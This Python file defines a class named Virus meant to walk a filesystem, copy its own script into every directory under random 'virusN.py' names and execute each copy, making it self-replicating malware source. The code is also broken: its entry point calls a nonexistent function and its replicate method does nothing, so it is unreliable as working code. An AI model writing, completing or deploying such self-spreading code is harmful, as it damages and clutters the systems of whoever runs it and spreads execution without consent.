import os
import shutil
import random

class Virus:
    def __init__(self, path= None, target_director= None, repeat=None):
        self.path= path
        self.target_director= []
        self.repeat= 2
        self.own_path= os.path.realpath(__file__)
    
    def list_directories(self, path):
        self.target_director.append(path)
        current_directory= os.listdir(path)
        for file in current_directory:
            if not file.startswith("."):
                absolute_path= os.path.join(path, file)
                print(absolute_path)
                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    def new_virus(self):
        for directory in self.target_director:
            l= random.randint(0,10)
            new_script= ("virus"+ str(l)+".py")
            destination= os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination)
            os.system(new_script)
    
    def replicate(self):
        for directory in self.target_director:
            file_list= os.listdir(directory)
            for file in file_list:
                a_path= os.path.join(directory, file)

if __name__== "__main__":
    current_directory= os.path.a_path("")
    Virus= Virus(path=current_directory)
    Virus.replicate()







